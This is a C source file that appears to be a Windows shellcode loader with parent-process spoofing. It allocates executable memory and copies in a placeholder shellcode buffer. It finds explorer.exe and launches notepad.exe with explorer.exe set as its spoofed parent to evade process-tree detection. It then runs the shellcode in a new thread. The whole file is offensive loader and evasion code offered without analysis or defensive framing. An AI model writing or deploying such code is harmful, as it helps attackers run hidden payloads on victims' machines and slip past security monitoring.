#include <Windows.h>
#include <psapi.h>

void main()
{
	const char shellcode[] =
		"[Shellcode]";  //嵌入Shellcode
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	DWORD runningProcessesIDs[1024];
	DWORD runningProcessesCountBytes;
	DWORD runningProcessesCount;
	HANDLE hExplorerexe = NULL;
	EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
	runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
	for (int i = 0; i < runningProcessesCount; i++)
	{
		if (runningProcessesIDs[i] != 0)
		{
			HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, runningProcessesIDs[i]);
			char processName[MAX_PATH + 1];
			GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
			_strlwr(processName);
			if (strstr(processName, "explorer.exe") && hProcess)
			{
				hExplorerexe = hProcess;
			}
		}
	}
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
	RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}
